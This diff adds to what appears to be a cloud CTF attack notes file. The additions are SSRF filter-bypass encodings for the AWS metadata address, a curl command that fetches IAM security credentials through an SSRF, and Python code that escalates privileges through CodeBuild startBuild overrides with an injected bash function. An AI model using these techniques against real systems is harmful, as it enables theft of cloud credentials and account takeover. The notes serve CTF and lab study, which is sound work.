@@ -35,9 +35,25 @@ Action categories and their escalation potential:
 
 This is the most common cloud CTF initial-access pattern.
 
+### IP blocklist bypass encodings
+Applications that blocklist `169.254.169.254` often miss alternative representations:
+
+| Format | Value | Notes |
+|--------|-------|-------|
+| Decimal | `2852039166` | `169*256^3 + 254*256^2 + 169*256 + 254` |
+| Octal | `0251.0376.0251.0376` | each octet in octal |
+| Hex | `0xa9.0xfe.0xa9.0xfe` | each octet in hex |
+| Mixed | `169.0376.0xa9.254` | combine formats |
+| IPv6-mapped | `::ffff:169.254.169.254` | |
+| Localhost redirect | `http://localtest.me/...` | DNS resolves to 127.0.0.1 |
+
+**Suffix filter bypass**: If the SSRF requires URLs ending in `.yaml`/`.json`, append `?a=test.yaml` or `#test.yaml`.
+
 ```bash
 # Step 1: confirm SSRF to internal metadata (IMDSv1 — direct GET)
 curl http://<target>/proxy?url=http://169.254.169.254/latest/meta-data/
+# With octal bypass:
+curl http://<target>/proxy?url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/<role>?a=test.yaml
 
 # IMDSv2 — requires token first (PUT → GET)
 # Step 2a: get token (must go through the SSRF)
@@ -187,6 +203,28 @@ When given a bare unique ID like `AROAXYAFLIG2BLQFIIP34`:
 Resolution: create a free AWS account → IAM → Create Role → Custom trust policy with the unique ID as `Principal` → save → open Trust relationships tab → AWS resolves it to the full ARN.
 
 ---
+
+## CodeBuild privilege escalation via startBuild overrides
+
+With `codebuild:CreateProject` + `codebuild:StartBuild` (no `iam:PassRole` needed in LocalStack/floci):
+
+```python
+# Create project with privileged container
+cb.create_project(name="pwn", source={"type": "NO_SOURCE", "buildspec": BS},
+    artifacts={"type": "NO_ARTIFACTS"},
+    environment={"type": "LINUX_CONTAINER", "image": "<image>",
+        "computeType": "BUILD_GENERAL1_SMALL", "privilegedMode": True},
+    serviceRole="arn:aws:iam::<account>:role/<role>")
+
+# startBuild with env var overrides and buildspec override
+cb.start_build(projectName="pwn",
+    environmentVariablesOverride=[  # injected into container env
+        {"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}
+    ],
+    buildspecOverride=BUILDSPEC)  # override buildspec without updating project
+```
+
+**Key overrides available in `startBuild`**: `imageOverride`, `environmentVariablesOverride`, `buildspecOverride`, `computeTypeOverride`, `privilegedModeOverride`. These allow escalating a single build without modifying the project.
 
 ## Common pitfalls
 
